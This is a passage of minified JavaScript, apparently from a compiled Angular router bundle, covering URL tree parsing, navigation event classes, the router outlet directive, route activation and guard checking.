i=By(this.remaining);i&&(r=i,this.capture(r))}e[Ih(t)]=Ih(r)}parseQueryParam(e){let t=c2(this.remaining);if(!t)return;this.capture(t);let r="";if(this.consumeOptional("=")){let s=l2(this.remaining);s&&(r=s,this.capture(r))}let i=$T(t),o=$T(r);if(e.hasOwnProperty(i)){let s=e[i];Array.isArray(s)||(s=[s],e[i]=s),s.push(o)}else e[i]=o}parseParens(e){let t={};for(this.capture("(");!this.consumeOptional(")")&&this.remaining.length>0;){let r=By(this.remaining),i=this.remaining[r.length];if(i!=="/"&&i!==")"&&i!==";")throw new Y(4010,!1);let o;r.indexOf(":")>-1?(o=r.slice(0,r.indexOf(":")),this.capture(o),this.capture(":")):e&&(o=oe);let s=this.parseChildren();t[o]=Object.keys(s).length===1?s[oe]:new Te([],s),this.consumeOptional("//")}return t}peekStartsWith(e){return this.remaining.startsWith(e)}consumeOptional(e){return this.peekStartsWith(e)?(this.remaining=this.remaining.substring(e.length),!0):!1}capture(e){if(!this.consumeOptional(e))throw new Y(4011,!1)}};function oS(n){return n.segments.length>0?new Te([],{[oe]:n}):n}function sS(n){let e={};for(let[r,i]of Object.entries(n.children)){let o=sS(i);if(r===oe&&o.segments.length===0&&o.hasChildren())for(let[s,a]of Object.entries(o.children))e[s]=a;else(o.segments.length>0||o.hasChildren())&&(e[r]=o)}let t=new Te(n.segments,e);return d2(t)}function d2(n){if(n.numberOfChildren===1&&n.children[oe]){let e=n.children[oe];return new Te(n.segments.concat(e.segments),e.children)}return n}function kc(n){return n instanceof Dr}function h2(n,e,t=null,r=null){let i=aS(n);return cS(i,e,t,r)}function aS(n){let e;function t(o){let s={};for(let c of o.children){let l=t(c);s[c.outlet]=l}let a=new Te(o.url,s);return o===n&&(e=a),a}let r=t(n.root),i=oS(r);return e??i}function cS(n,e,t,r){let i=n;for(;i.parent;)i=i.parent;if(e.length===0)return $y(i,i,i,t,r);let o=f2(e);if(o.toRoot())return $y(i,i,new Te([],{}),t,r);let s=p2(o,i,n),a=s.processChildren?Rc(s.segmentGroup,s.index,o.commands):lS(s.segmentGroup,s.index,o.commands);return $y(i,s.segmentGroup,a,t,r)}function Dh(n){return typeof n=="object"&&n!=null&&!n.outlets&&!n.segmentPath}function Oc(n){return typeof n=="object"&&n!=null&&n.outlets}function $y(n,e,t,r,i){let o={};r&&Object.entries(r).forEach(([c,l])=>{o[c]=Array.isArray(l)?l.map(h=>`${h}`):`${l}`});let s;n===e?s=t:s=uS(n,e,t);let a=oS(sS(s));return new Dr(a,o,i)}function uS(n,e,t){let r={};return Object.entries(n.children).forEach(([i,o])=>{o===e?r[i]=t:r[i]=uS(o,e,t)}),new Te(n.segments,r)}var Ch=class{isAbsolute;numberOfDoubleDots;commands;constructor(e,t,r){if(this.isAbsolute=e,this.numberOfDoubleDots=t,this.commands=r,e&&r.length>0&&Dh(r[0]))throw new Y(4003,!1);let i=r.find(Oc);if(i&&i!==JT(r))throw new Y(4004,!1)}toRoot(){return this.isAbsolute&&this.commands.length===1&&this.commands[0]=="/"}};function f2(n){if(typeof n[0]=="string"&&n.length===1&&n[0]==="/")return new Ch(!0,0,n);let e=0,t=!1,r=n.reduce((i,o,s)=>{if(typeof o=="object"&&o!=null){if(o.outlets){let a={};return Object.entries(o.outlets).forEach(([c,l])=>{a[c]=typeof l=="string"?l.split("/"):l}),[...i,{outlets:a}]}if(o.segmentPath)return[...i,o.segmentPath]}return typeof o!="string"?[...i,o]:s===0?(o.split("/").forEach((a,c)=>{c==0&&a==="."||(c==0&&a===""?t=!0:a===".."?e++:a!=""&&i.push(a))}),i):[...i,o]},[]);return new Ch(t,e,r)}var Es=class{segmentGroup;processChildren;index;constructor(e,t,r){this.segmentGroup=e,this.processChildren=t,this.index=r}};function p2(n,e,t){if(n.isAbsolute)return new Es(e,!0,0);if(!t)return new Es(e,!1,NaN);if(t.parent===null)return new Es(t,!0,0);let r=Dh(n.commands[0])?0:1,i=t.segments.length-1+r;return g2(t,i,n.numberOfDoubleDots)}function g2(n,e,t){let r=n,i=e,o=t;for(;o>i;){if(o-=i,r=r.parent,!r)throw new Y(4005,!1);i=r.segments.length}return new Es(r,!1,i-o)}function m2(n){return Oc(n[0])?n[0].outlets:{[oe]:n}}function lS(n,e,t){if(n??=new Te([],{}),n.segments.length===0&&n.hasChildren())return Rc(n,e,t);let r=y2(n,e,t),i=t.slice(r.commandIndex);if(r.match&&r.pathIndex<n.segments.length){let o=new Te(n.segments.slice(0,r.pathIndex),{});return o.children[oe]=new Te(n.segments.slice(r.pathIndex),n.children),Rc(o,0,i)}else return r.match&&i.length===0?new Te(n.segments,{}):r.match&&!n.hasChildren()?Qy(n,e,t):r.match?Rc(n,0,i):Qy(n,e,t)}function Rc(n,e,t){if(t.length===0)return new Te(n.segments,{});{let r=m2(t),i={};if(Object.keys(r).some(o=>o!==oe)&&n.children[oe]&&n.numberOfChildren===1&&n.children[oe].segments.length===0){let o=Rc(n.children[oe],e,t);return new Te(n.segments,o.children)}return Object.entries(r).forEach(([o,s])=>{typeof s=="string"&&(s=[s]),s!==null&&(i[o]=lS(n.children[o],e,s))}),Object.entries(n.children).forEach(([o,s])=>{r[o]===void 0&&(i[o]=s)}),new Te(n.segments,i)}}function y2(n,e,t){let r=0,i=e,o={match:!1,pathIndex:0,commandIndex:0};for(;i<n.segments.length;){if(r>=t.length)return o;let s=n.segments[i],a=t[r];if(Oc(a))break;let c=`${a}`,l=r<t.length-1?t[r+1]:null;if(i>0&&c===void 0)break;if(c&&l&&typeof l=="object"&&l.outlets===void 0){if(!qT(c,l,s))return o;r+=2}else{if(!qT(c,{},s))return o;r++}i++}return{match:!0,pathIndex:i,commandIndex:r}}function Qy(n,e,t){let r=n.segments.slice(0,e),i=0;for(;i<t.length;){let o=t[i];if(Oc(o)){let c=v2(o.outlets);return new Te(r,c)}if(i===0&&Dh(t[0])){let c=n.segments[e];r.push(new no(c.path,HT(t[0]))),i++;continue}let s=Oc(o)?o.outlets[oe]:`${o}`,a=i<t.length-1?t[i+1]:null;s&&a&&Dh(a)?(r.push(new no(s,HT(a))),i+=2):(r.push(new no(s,{})),i++)}return new Te(r,{})}function v2(n){let e={};return Object.entries(n).forEach(([t,r])=>{typeof r=="string"&&(r=[r]),r!==null&&(e[t]=Qy(new Te([],{}),0,r))}),e}function HT(n){let e={};return Object.entries(n).forEach(([t,r])=>e[t]=`${r}`),e}function qT(n,e,t){return n==t.path&&Hn(e,t.parameters)}var Nc="imperative",ft=function(n){return n[n.NavigationStart=0]="NavigationStart",n[n.NavigationEnd=1]="NavigationEnd",n[n.NavigationCancel=2]="NavigationCancel",n[n.NavigationError=3]="NavigationError",n[n.RoutesRecognized=4]="RoutesRecognized",n[n.ResolveStart=5]="ResolveStart",n[n.ResolveEnd=6]="ResolveEnd",n[n.GuardsCheckStart=7]="GuardsCheckStart",n[n.GuardsCheckEnd=8]="GuardsCheckEnd",n[n.RouteConfigLoadStart=9]="RouteConfigLoadStart",n[n.RouteConfigLoadEnd=10]="RouteConfigLoadEnd",n[n.ChildActivationStart=11]="ChildActivationStart",n[n.ChildActivationEnd=12]="ChildActivationEnd",n[n.ActivationStart=13]="ActivationStart",n[n.ActivationEnd=14]="ActivationEnd",n[n.Scroll=15]="Scroll",n[n.NavigationSkipped=16]="NavigationSkipped",n}(ft||{}),pn=class{id;url;constructor(e,t){this.id=e,this.url=t}},Ts=class extends pn{type=ft.NavigationStart;navigationTrigger;restoredState;constructor(e,t,r="imperative",i=null){super(e,t),this.navigationTrigger=r,this.restoredState=i}toString(){return`NavigationStart(id: ${this.id}, url: '${this.url}')`}},Cr=class extends pn{urlAfterRedirects;type=ft.NavigationEnd;constructor(e,t,r){super(e,t),this.urlAfterRedirects=r}toString(){return`NavigationEnd(id: ${this.id}, url: '${this.url}', urlAfterRedirects: '${this.urlAfterRedirects}')`}},nn=function(n){return n[n.Redirect=0]="Redirect",n[n.SupersededByNewNavigation=1]="SupersededByNewNavigation",n[n.NoDataFromResolver=2]="NoDataFromResolver",n[n.GuardRejected=3]="GuardRejected",n}(nn||{}),bh=function(n){return n[n.IgnoredSameUrlNavigation=0]="IgnoredSameUrlNavigation",n[n.IgnoredByUrlHandlingStrategy=1]="IgnoredByUrlHandlingStrategy",n}(bh||{}),Ir=class extends pn{reason;code;type=ft.NavigationCancel;constructor(e,t,r,i){super(e,t),this.reason=r,this.code=i}toString(){return`NavigationCancel(id: ${this.id}, url: '${this.url}')`}},ai=class extends pn{reason;code;type=ft.NavigationSkipped;constructor(e,t,r,i){super(e,t),this.reason=r,this.code=i}},Fc=class extends pn{error;target;type=ft.NavigationError;constructor(e,t,r,i){super(e,t),this.error=r,this.target=i}toString(){return`NavigationError(id: ${this.id}, url: '${this.url}', error: ${this.error})`}},Th=class extends pn{urlAfterRedirects;state;type=ft.RoutesRecognized;constructor(e,t,r,i){super(e,t),this.urlAfterRedirects=r,this.state=i}toString(){return`RoutesRecognized(id: ${this.id}, url: '${this.url}', urlAfterRedirects: '${this.urlAfterRedirects}', state: ${this.state})`}},Yy=class extends pn{urlAfterRedirects;state;type=ft.GuardsCheckStart;constructor(e,t,r,i){super(e,t),this.urlAfterRedirects=r,this.state=i}toString(){return`GuardsCheckStart(id: ${this.id}, url: '${this.url}', urlAfterRedirects: '${this.urlAfterRedirects}', state: ${this.state})`}},Zy=class extends pn{urlAfterRedirects;state;shouldActivate;type=ft.GuardsCheckEnd;constructor(e,t,r,i,o){super(e,t),this.urlAfterRedirects=r,this.state=i,this.shouldActivate=o}toString(){return`GuardsCheckEnd(id: ${this.id}, url: '${this.url}', urlAfterRedirects: '${this.urlAfterRedirects}', state: ${this.state}, shouldActivate: ${this.shouldActivate})`}},Jy=class extends pn{urlAfterRedirects;state;type=ft.ResolveStart;constructor(e,t,r,i){super(e,t),this.urlAfterRedirects=r,this.state=i}toString(){return`ResolveStart(id: ${this.id}, url: '${this.url}', urlAfterRedirects: '${this.urlAfterRedirects}', state: ${this.state})`}},Xy=class extends pn{urlAfterRedirects;state;type=ft.ResolveEnd;constructor(e,t,r,i){super(e,t),this.urlAfterRedirects=r,this.state=i}toString(){return`ResolveEnd(id: ${this.id}, url: '${this.url}', urlAfterRedirects: '${this.urlAfterRedirects}', state: ${this.state})`}},ev=class{route;type=ft.RouteConfigLoadStart;constructor(e){this.route=e}toString(){return`RouteConfigLoadStart(path: ${this.route.path})`}},tv=class{route;type=ft.RouteConfigLoadEnd;constructor(e){this.route=e}toString(){return`RouteConfigLoadEnd(path: ${this.route.path})`}},nv=class{snapshot;type=ft.ChildActivationStart;constructor(e){this.snapshot=e}toString(){return`ChildActivationStart(path: '${this.snapshot.routeConfig&&this.snapshot.routeConfig.path||""}')`}},rv=class{snapshot;type=ft.ChildActivationEnd;constructor(e){this.snapshot=e}toString(){return`ChildActivationEnd(path: '${this.snapshot.routeConfig&&this.snapshot.routeConfig.path||""}')`}},iv=class{snapshot;type=ft.ActivationStart;constructor(e){this.snapshot=e}toString(){return`ActivationStart(path: '${this.snapshot.routeConfig&&this.snapshot.routeConfig.path||""}')`}},ov=class{snapshot;type=ft.ActivationEnd;constructor(e){this.snapshot=e}toString(){return`ActivationEnd(path: '${this.snapshot.routeConfig&&this.snapshot.routeConfig.path||""}')`}},Sh=class{routerEvent;position;anchor;type=ft.Scroll;constructor(e,t,r){this.routerEvent=e,this.position=t,this.anchor=r}toString(){let e=this.position?`${this.position[0]}, ${this.position[1]}`:null;return`Scroll(anchor: '${this.anchor}', position: '${e}')`}},Vc=class{},Ss=class{url;navigationBehaviorOptions;constructor(e,t){this.url=e,this.navigationBehaviorOptions=t}};function _2(n,e){return n.providers&&!n._injector&&(n._injector=Hd(n.providers,e,`Route: ${n.path}`)),n._injector??e}function Tn(n){return n.outlet||oe}function w2(n,e){let t=n.filter(r=>Tn(r)===e);return t.push(...n.filter(r=>Tn(r)!==e)),t}function qc(n){if(!n)return null;if(n.routeConfig?._injector)return n.routeConfig._injector;for(let e=n.parent;e;e=e.parent){let t=e.routeConfig;if(t?._loadedInjector)return t._loadedInjector;if(t?._injector)return t._injector}return null}var sv=class{rootInjector;outlet=null;route=null;children;attachRef=null;get injector(){return qc(this.route?.snapshot)??this.rootInjector}constructor(e){this.rootInjector=e,this.children=new zc(this.rootInjector)}},zc=(()=>{class n{rootInjector;contexts=new Map;constructor(t){this.rootInjector=t}onChildOutletCreated(t,r){let i=this.getOrCreateContext(t);i.outlet=r,this.contexts.set(t,i)}onChildOutletDestroyed(t){let r=this.getContext(t);r&&(r.outlet=null,r.attachRef=null)}onOutletDeactivated(){let t=this.contexts;return this.contexts=new Map,t}onOutletReAttached(t){this.contexts=t}getOrCreateContext(t){let r=this.getContext(t);return r||(r=new sv(this.rootInjector),this.contexts.set(t,r)),r}getContext(t){return this.contexts.get(t)||null}static \u0275fac=function(r){return new(r||n)(L(Pt))};static \u0275prov=W({token:n,factory:n.\u0275fac,providedIn:"root"})}return n})(),Ah=class{_root;constructor(e){this._root=e}get root(){return this._root.value}parent(e){let t=this.pathFromRoot(e);return t.length>1?t[t.length-2]:null}children(e){let t=av(e,this._root);return t?t.children.map(r=>r.value):[]}firstChild(e){let t=av(e,this._root);return t&&t.children.length>0?t.children[0].value:null}siblings(e){let t=cv(e,this._root);return t.length<2?[]:t[t.length-2].children.map(i=>i.value).filter(i=>i!==e)}pathFromRoot(e){return cv(e,this._root).map(t=>t.value)}};function av(n,e){if(n===e.value)return e;for(let t of e.children){let r=av(n,t);if(r)return r}return null}function cv(n,e){if(n===e.value)return[e];for(let t of e.children){let r=cv(n,t);if(r.length)return r.unshift(e),r}return[]}var tn=class{value;children;constructor(e,t){this.value=e,this.children=t}toString(){return`TreeNode(${this.value})`}};function ws(n){let e={};return n&&n.children.forEach(t=>e[t.value.outlet]=t),e}var Mh=class extends Ah{snapshot;constructor(e,t){super(e),this.snapshot=t,yv(this,e)}toString(){return this.snapshot.toString()}};function dS(n){let e=E2(n),t=new gt([new no("",{})]),r=new gt({}),i=new gt({}),o=new gt({}),s=new gt(""),a=new As(t,r,o,s,i,oe,n,e.root);return a.snapshot=e.root,new Mh(new tn(a,[]),e)}function E2(n){let e={},t={},r={},i="",o=new Is([],e,r,i,t,oe,n,null,{});return new Rh("",new tn(o,[]))}var As=class{urlSubject;paramsSubject;queryParamsSubject;fragmentSubject;dataSubject;outlet;component;snapshot;_futureSnapshot;_routerState;_paramMap;_queryParamMap;title;url;params;queryParams;fragment;data;constructor(e,t,r,i,o,s,a,c){this.urlSubject=e,this.paramsSubject=t,this.queryParamsSubject=r,this.fragmentSubject=i,this.dataSubject=o,this.outlet=s,this.component=a,this._futureSnapshot=c,this.title=this.dataSubject?.pipe(X(l=>l[$c]))??J(void 0),this.url=e,this.params=t,this.queryParams=r,this.fragment=i,this.data=o}get routeConfig(){return this._futureSnapshot.routeConfig}get root(){return this._routerState.root}get parent(){return this._routerState.parent(this)}get firstChild(){return this._routerState.firstChild(this)}get children(){return this._routerState.children(this)}get pathFromRoot(){return this._routerState.pathFromRoot(this)}get paramMap(){return this._paramMap??=this.params.pipe(X(e=>Cs(e))),this._paramMap}get queryParamMap(){return this._queryParamMap??=this.queryParams.pipe(X(e=>Cs(e))),this._queryParamMap}toString(){return this.snapshot?this.snapshot.toString():`Future(${this._futureSnapshot})`}};function xh(n,e,t="emptyOnly"){let r,{routeConfig:i}=n;return e!==null&&(t==="always"||i?.path===""||!e.component&&!e.routeConfig?.loadComponent)?r={params:U(U({},e.params),n.params),data:U(U({},e.data),n.data),resolve:U(U(U(U({},n.data),e.data),i?.data),n._resolvedData)}:r={params:U({},n.params),data:U({},n.data),resolve:U(U({},n.data),n._resolvedData??{})},i&&fS(i)&&(r.resolve[$c]=i.title),r}var Is=class{url;params;queryParams;fragment;data;outlet;component;routeConfig;_resolve;_resolvedData;_routerState;_paramMap;_queryParamMap;get title(){return this.data?.[$c]}constructor(e,t,r,i,o,s,a,c,l){this.url=e,this.params=t,this.queryParams=r,this.fragment=i,this.data=o,this.outlet=s,this.component=a,this.routeConfig=c,this._resolve=l}get root(){return this._routerState.root}get parent(){return this._routerState.parent(this)}get firstChild(){return this._routerState.firstChild(this)}get children(){return this._routerState.children(this)}get pathFromRoot(){return this._routerState.pathFromRoot(this)}get paramMap(){return this._paramMap??=Cs(this.params),this._paramMap}get queryParamMap(){return this._queryParamMap??=Cs(this.queryParams),this._queryParamMap}toString(){let e=this.url.map(r=>r.toString()).join("/"),t=this.routeConfig?this.routeConfig.path:"";return`Route(url:'${e}', path:'${t}')`}},Rh=class extends Ah{url;constructor(e,t){super(t),this.url=e,yv(this,t)}toString(){return hS(this._root)}};function yv(n,e){e.value._routerState=n,e.children.forEach(t=>yv(n,t))}function hS(n){let e=n.children.length>0?` { ${n.children.map(hS).join(", ")} } `:"";return`${n.value}${e}`}function Hy(n){if(n.snapshot){let e=n.snapshot,t=n._futureSnapshot;n.snapshot=t,Hn(e.queryParams,t.queryParams)||n.queryParamsSubject.next(t.queryParams),e.fragment!==t.fragment&&n.fragmentSubject.next(t.fragment),Hn(e.params,t.params)||n.paramsSubject.next(t.params),KL(e.url,t.url)||n.urlSubject.next(t.url),Hn(e.data,t.data)||n.dataSubject.next(t.data)}else n.snapshot=n._futureSnapshot,n.dataSubject.next(n._futureSnapshot.data)}function uv(n,e){let t=Hn(n.params,e.params)&&JL(n.url,e.url),r=!n.parent!=!e.parent;return t&&!r&&(!n.parent||uv(n.parent,e.parent))}function fS(n){return typeof n.title=="string"||n.title===null}var I2=new j(""),vv=(()=>{class n{activated=null;get activatedComponentRef(){return this.activated}_activatedRoute=null;name=oe;activateEvents=new ht;deactivateEvents=new ht;attachEvents=new ht;detachEvents=new ht;routerOutletData=HC(void 0);parentContexts=V(zc);location=V($d);changeDetector=V(eo);inputBinder=V(Fh,{optional:!0});supportsBindingToComponentInputs=!0;ngOnChanges(t){if(t.name){let{firstChange:r,previousValue:i}=t.name;if(r)return;this.isTrackedInParentContexts(i)&&(this.deactivate(),this.parentContexts.onChildOutletDestroyed(i)),this.initializeOutletWithName()}}ngOnDestroy(){this.isTrackedInParentContexts(this.name)&&this.parentContexts.onChildOutletDestroyed(this.name),this.inputBinder?.unsubscribeFromRouteData(this)}isTrackedInParentContexts(t){return this.parentContexts.getContext(t)?.outlet===this}ngOnInit(){this.initializeOutletWithName()}initializeOutletWithName(){if(this.parentContexts.onChildOutletCreated(this.name,this),this.activated)return;let t=this.parentContexts.getContext(this.name);t?.route&&(t.attachRef?this.attach(t.attachRef,t.route):this.activateWith(t.route,t.injector))}get isActivated(){return!!this.activated}get component(){if(!this.activated)throw new Y(4012,!1);return this.activated.instance}get activatedRoute(){if(!this.activated)throw new Y(4012,!1);return this._activatedRoute}get activatedRouteData(){return this._activatedRoute?this._activatedRoute.snapshot.data:{}}detach(){if(!this.activated)throw new Y(4012,!1);this.location.detach();let t=this.activated;return this.activated=null,this._activatedRoute=null,this.detachEvents.emit(t.instance),t}attach(t,r){this.activated=t,this._activatedRoute=r,this.location.insert(t.hostView),this.inputBinder?.bindActivatedRouteToOutletComponent(this),this.attachEvents.emit(t.instance)}deactivate(){if(this.activated){let t=this.component;this.activated.destroy(),this.activated=null,this._activatedRoute=null,this.deactivateEvents.emit(t)}}activateWith(t,r){if(this.isActivated)throw new Y(4013,!1);this._activatedRoute=t;let i=this.location,s=t.snapshot.component,a=this.parentContexts.getOrCreateContext(this.name).children,c=new lv(t,a,i.injector,this.routerOutletData);this.activated=i.createComponent(s,{index:i.length,injector:c,environmentInjector:r}),this.changeDetector.markForCheck(),this.inputBinder?.bindActivatedRouteToOutletComponent(this),this.activateEvents.emit(this.activated.instance)}static \u0275fac=function(r){return new(r||n)};static \u0275dir=zt({type:n,selectors:[["router-outlet"]],inputs:{name:"name",routerOutletData:[1,"routerOutletData"]},outputs:{activateEvents:"activate",deactivateEvents:"deactivate",attachEvents:"attach",detachEvents:"detach"},exportAs:["outlet"],features:[hs]})}return n})(),lv=class n{route;childContexts;parent;outletData;__ngOutletInjector(e){return new n(this.route,this.childContexts,e,this.outletData)}constructor(e,t,r,i){this.route=e,this.childContexts=t,this.parent=r,this.outletData=i}get(e,t){return e===As?this.route:e===zc?this.childContexts:e===I2?this.outletData:this.parent.get(e,t)}},Fh=new j(""),zT=(()=>{class n{outletDataSubscriptions=new Map;bindActivatedRouteToOutletComponent(t){this.unsubscribeFromRouteData(t),this.subscribeToRouteData(t)}unsubscribeFromRouteData(t){this.outletDataSubscriptions.get(t)?.unsubscribe(),this.outletDataSubscriptions.delete(t)}subscribeToRouteData(t){let{activatedRoute:r}=t,i=Xa([r.queryParams,r.params,r.data]).pipe(Le(([o,s,a],c)=>(a=U(U(U({},o),s),a),c===0?J(a):Promise.resolve(a)))).subscribe(o=>{if(!t.isActivated||!t.activatedComponentRef||t.activatedRoute!==r||r.component===null){this.unsubscribeFromRouteData(t);return}let s=Jb(r.component);if(!s){this.unsubscribeFromRouteData(t);return}for(let{templateName:a}of s.inputs)t.activatedComponentRef.setInput(a,o[a])});this.outletDataSubscriptions.set(t,i)}static \u0275fac=function(r){return new(r||n)};static \u0275prov=W({token:n,factory:n.\u0275fac})}return n})();function D2(n,e,t){let r=Lc(n,e._root,t?t._root:void 0);return new Mh(r,e)}function Lc(n,e,t){if(t&&n.shouldReuseRoute(e.value,t.value.snapshot)){let r=t.value;r._futureSnapshot=e.value;let i=C2(n,e,t);return new tn(r,i)}else{if(n.shouldAttach(e.value)){let o=n.retrieve(e.value);if(o!==null){let s=o.route;return s.value._futureSnapshot=e.value,s.children=e.children.map(a=>Lc(n,a)),s}}let r=b2(e.value),i=e.children.map(o=>Lc(n,o));return new tn(r,i)}}function C2(n,e,t){return e.children.map(r=>{for(let i of t.children)if(n.shouldReuseRoute(r.value,i.value.snapshot))return Lc(n,r,i);return Lc(n,r)})}function b2(n){return new As(new gt(n.url),new gt(n.params),new gt(n.queryParams),new gt(n.fragment),new gt(n.data),n.outlet,n.component,n)}var Uc=class{redirectTo;navigationBehaviorOptions;constructor(e,t){this.redirectTo=e,this.navigationBehaviorOptions=t}},pS="ngNavigationCancelingError";function Nh(n,e){let{redirectTo:t,navigationBehaviorOptions:r}=kc(e)?{redirectTo:e,navigationBehaviorOptions:void 0}:e,i=gS(!1,nn.Redirect);return i.url=t,i.navigationBehaviorOptions=r,i}function gS(n,e){let t=new Error(`NavigationCancelingError: ${n||""}`);return t[pS]=!0,t.cancellationCode=e,t}function T2(n){return mS(n)&&kc(n.url)}function mS(n){return!!n&&n[pS]}var S2=(n,e,t,r)=>X(i=>(new dv(e,i.targetRouterState,i.currentRouterState,t,r).activate(n),i)),dv=class{routeReuseStrategy;futureState;currState;forwardEvent;inputBindingEnabled;constructor(e,t,r,i,o){this.routeReuseStrategy=e,this.futureState=t,this.currState=r,this.forwardEvent=i,this.inputBindingEnabled=o}activate(e){let t=this.futureState._root,r=this.currState?this.currState._root:null;this.deactivateChildRoutes(t,r,e),Hy(this.futureState.root),this.activateChildRoutes(t,r,e)}deactivateChildRoutes(e,t,r){let i=ws(t);e.children.forEach(o=>{let s=o.value.outlet;this.deactivateRoutes(o,i[s],r),delete i[s]}),Object.values(i).forEach(o=>{this.deactivateRouteAndItsChildren(o,r)})}deactivateRoutes(e,t,r){let i=e.value,o=t?t.value:null;if(i===o)if(i.component){let s=r.getContext(i.outlet);s&&this.deactivateChildRoutes(e,t,s.children)}else this.deactivateChildRoutes(e,t,r);else o&&this.deactivateRouteAndItsChildren(t,r)}deactivateRouteAndItsChildren(e,t){e.value.component&&this.routeReuseStrategy.shouldDetach(e.value.snapshot)?this.detachAndStoreRouteSubtree(e,t):this.deactivateRouteAndOutlet(e,t)}detachAndStoreRouteSubtree(e,t){let r=t.getContext(e.value.outlet),i=r&&e.value.component?r.children:t,o=ws(e);for(let s of Object.values(o))this.deactivateRouteAndItsChildren(s,i);if(r&&r.outlet){let s=r.outlet.detach(),a=r.children.onOutletDeactivated();this.routeReuseStrategy.store(e.value.snapshot,{componentRef:s,route:e,contexts:a})}}deactivateRouteAndOutlet(e,t){let r=t.getContext(e.value.outlet),i=r&&e.value.component?r.children:t,o=ws(e);for(let s of Object.values(o))this.deactivateRouteAndItsChildren(s,i);r&&(r.outlet&&(r.outlet.deactivate(),r.children.onOutletDeactivated()),r.attachRef=null,r.route=null)}activateChildRoutes(e,t,r){let i=ws(t);e.children.forEach(o=>{this.activateRoutes(o,i[o.value.outlet],r),this.forwardEvent(new ov(o.value.snapshot))}),e.children.length&&this.forwardEvent(new rv(e.value.snapshot))}activateRoutes(e,t,r){let i=e.value,o=t?t.value:null;if(Hy(i),i===o)if(i.component){let s=r.getOrCreateContext(i.outlet);this.activateChildRoutes(e,t,s.children)}else this.activateChildRoutes(e,t,r);else if(i.component){let s=r.getOrCreateContext(i.outlet);if(this.routeReuseStrategy.shouldAttach(i.snapshot)){let a=this.routeReuseStrategy.retrieve(i.snapshot);this.routeReuseStrategy.store(i.snapshot,null),s.children.onOutletReAttached(a.contexts),s.attachRef=a.componentRef,s.route=a.route.value,s.outlet&&s.outlet.attach(a.componentRef,a.route.value),Hy(a.route.value),this.activateChildRoutes(e,null,s.children)}else s.attachRef=null,s.route=i,s.outlet&&s.outlet.activateWith(i,s.injector),this.activateChildRoutes(e,null,s.children)}else this.activateChildRoutes(e,null,r)}},Ph=class{path;route;constructor(e){this.path=e,this.route=this.path[this.path.length-1]}},Ds=class{component;route;constructor(e,t){this.component=e,this.route=t}};function A2(n,e,t){let r=n._root,i=e?e._root:null;return Mc(r,i,t,[r.value])}function M2(n){let e=n.routeConfig?n.routeConfig.canActivateChild:null;return!e||e.length===0?null:{node:n,guards:e}}function xs(n,e){let t=Symbol(),r=e.get(n,t);return r===t?typeof n=="function"&&!k0(n)?n:e.get(n):r}function Mc(n,e,t,r,i={canDeactivateChecks:[],canActivateChecks:[]}){let o=ws(e);return n.children.forEach(s=>{x2(s,o[s.value.outlet],t,r.concat([s.value]),i),delete o[s.value.outlet]}),Object.entries(o).forEach(([s,a])=>Pc(a,t.getContext(s),i)),i}function x2(n,e,t,r,i={canDeactivateChecks:[],canActivateChecks:[]}){let o=n.value,s=e?e.value:null,a=t?t.getContext(n.value.outlet):null;if(s&&o.routeConfig===s.routeConfig){let c=R2(s,o,o.routeConfig.runGuardsAndResolvers);c?i.canActivateChecks.push(new Ph(r)):(o.data=s.data,o._resolvedData=s._resolvedData),o.component?Mc(n,e,a?a.children:null,r,i):Mc(n,e,t,r,i),c&&a&&a.outlet&&a.outlet.isActivated&&i.canDeactivateChecks.push(new Ds(a.outlet.component,s))}else s&&Pc(e,a,i),i.canActivateChecks.push(new Ph(r)),o.component?Mc(n,null,a?a.children:null,r,i):Mc(n,null,t,r,i);return i}function R2(n,e,t){if(typeof t=="function")return t(n,e);switch(t){case"pathParamsChange":return!ro(n.url,e.url);case"pathParamsOrQueryParamsChange":return!ro(n.url,e.url)||!Hn(n.queryParams,e.queryParams);case"always":return!0;case"paramsOrQueryParamsChange":return!uv(n,e)||!Hn(n.queryParams,e.queryParams);case"paramsChange":default:return!uv(n,e)}}function Pc(n,e,t){let r=ws(n),i=n.value;Object.entries(r).forEach(([o,s])=>{i.component?e?Pc(s,e.children.getContext(o),t):Pc(s,null,t):Pc(s,e,t)}),i.component?e&&e.outlet&&e.outlet.isActivated?t.canDeactivateChecks.push(new Ds(e.outlet.component,i)):t.canDeactivateChecks.push(new Ds(null,i)):t.canDeactivateChecks.push(new Ds(null,i))}function Gc(n){return typeof n=="function"}function N2(n){return typeof n=="boolean"}function P2(n){return n&&Gc(n.canLoad)}function k2(n){return n&&Gc(n.canActivate)}function O2(n){return n&&Gc(n.canActivateChild)}function F2(n){return n&&Gc(n.canDeactivate)}function V2(n){return n&&Gc(n.canMatch)}function yS(n){return n instanceof ir||n?.name==="EmptyError"}var _h=Symbol("INITIAL_VALUE");function Ms(){return Le(n=>Xa(n.map(e=>e.pipe(sr(1),ji(_h)))).pipe(X(e=>{for(let t of e)if(t!==!0){if(t===_h)return _h;if(t===!1||L2(t))return t}return!0}),ut(e=>e!==_h),sr(1)))}function L2(n){return kc(n)||n instanceof Uc}function U2(n,e){return tt(t=>{let{targetSnapshot:r,currentSnapshot:i,guards:{canActivateChecks:o,canDeactivateChecks:s}}=t;return s.length===0&&o.length===0?J(ue(U({},t),{guardsResult:!0})):j2(s,r,i,n).pipe(tt(a=>a&&N2(a)?B2(r,o,n,e):J(a)),X(a=>ue(U({},t),{guardsResult:a})))})}function j2(n,e,t,r){return me(n).pipe(tt(i=>G2(i.component,i.route,t,e,r)),an(i=>i!==!0,!0))}function B2(n,e,t,r){return me(e).pipe(or(i=>Go(H2(i.route.parent,r),$2(i.route,r),z2(n,i.path,t),q2(n,i.route,t))),an(i=>i!==!0,!0))}function $2(n,e){return n!==null&&e&&e(new iv(n)),J(!0)}function H2(n,e){return n!==null&&e&&e(new nv(n)),J(!0)}function q2(n,e,t){let r=e.routeConfig?e.routeConfig.canActivate:null;if(!r||r.length===0)return J(!0);let i=r.map(o=>Hl(()=>{let s=qc(e)??t,a=xs(o,s),c=k2(a)?a.canActivate(e,n):qt(s,()=>a(e,n));return ci(c).pipe(an())}));return J(i).pipe(Ms())}function z2(n,e,t){let r=e[e.length-1],o=e.slice(0,e.length-1).reverse().map(s=>M2(s)).filter(s=>s!==null).map(s=>Hl(()=>{let a=s.guards.map(c=>{let l=qc(s.node)??t,h=xs(c,l),p=O2(h)?h.canActivateChild(r,n):qt(l,()=>h(r,n));return ci(p).pipe(an())});return J(a).pipe(Ms())}));return J(o).pipe(Ms())}function G2(n,e,t,r,i){let 